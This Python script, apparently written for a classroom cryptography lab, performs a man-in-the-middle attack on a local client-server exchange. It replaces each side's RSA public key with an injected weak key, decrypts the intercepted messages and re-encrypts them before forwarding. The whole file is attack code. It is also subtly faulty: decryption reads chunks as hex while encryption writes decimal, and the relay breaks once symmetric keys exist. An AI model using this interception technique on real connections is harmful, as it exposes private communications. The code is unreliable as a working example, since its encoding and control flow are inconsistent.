import socket
from select import select

server_facing = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_facing.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_facing.connect(('localhost', 8081))

client_facing = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_facing.bind(('localhost', 8082))
client_facing.listen(1)
client_conn, client_addr = client_facing.accept()

symetric_keys = {
    'client_des': None,
    'server_des': None,
    'hmac': None
}
public_keys = {
    'client': {},
    'server': {}
}
injected_key = {
    'e': 3,
    'd': 27,
    'n': 55
}


    
def handle_message(message: str, site: str):
    print('("{}", {})'.format(message, site))
    # no need to interfere with generic status messages
    if message == 'Initialize' or message == 'ACK' or message is None:
        return message
    
    # RSA public key and modulus are send as comma seperated values
    elif ',' in message:
        e, n = message.split(',')
        public_keys[site]['e'] = int(e)
        public_keys[site]['n'] = int(n)

        print('[+] Intercepted {} public key: (e: {}, n: {})'.format(site, e, n))
        print('[+] Replacing with malicious public key: (e: {}, n: {})'.format(injected_key['e'], injected_key['n']))
        return '{}, {}'.format(injected_key['e'], injected_key['n'])

    # message must be encrypted
    else:
        # DES won't be used until both parties have established keys
        if (symetric_keys['client_des'] is None) or (symetric_keys['server_des'] is None):
            tmp = rsa_decrypt(message)
            print('[+] Intercepted and decrypted message "{}" from {}'.format(tmp, site))
            ciphertext = rsa_encrypt(tmp, site)
            print('[+] Re-encrypted message with {} public key: {}'.format(site, ciphertext))
            return ciphertext


# since we injected our own encryption key, all RSA encrypted communications will be encrypted with our key
def rsa_decrypt(ciphertext: str) -> str:
    # this group RSA encrypts their messages byte by byte, so we first need to split the ciphertext into chunks
    ciphertext_bytes = [ciphertext[pos:pos + 8] for pos in range(0, len(ciphertext), 8)]
    plaintext = [(int(byte, 16) ** injected_key['d']) % injected_key['n'] for byte in ciphertext_bytes]
    plaintext = [chr(byte) for byte in plaintext]
    return ''.join(plaintext)

def rsa_encrypt(plaintext: str, site: str) -> str:
    if site == 'client':
        target = 'server'
    else:
        target = 'client'

    e = public_keys[target]['e']
    n = public_keys[target]['n']
    ciphertext = []
    for c in plaintext:
        tmp = ord(c)
        tmp = (tmp ** e) % n
        ciphertext.append('{}'.format(tmp).zfill(8))
    return ''.join(ciphertext)

inputs = [client_conn, server_facing]
while inputs:
    readable, _, _ = select(inputs, [], [])
    if len(readable) > 0:
        for sock in readable:
            if sock == server_facing:
                server_message = server_facing.recv(1024).decode()
                message = handle_message(server_message, 'server')
                print('sending "{}"...'.format(message))
                client_conn.sendall(message.encode())
            elif sock == client_conn:
                client_message = client_conn.recv(1024).decode()
                message = handle_message(client_message, 'client')
                print('sending "{}"...'.format(message))
                server_facing.sendall(message.encode())


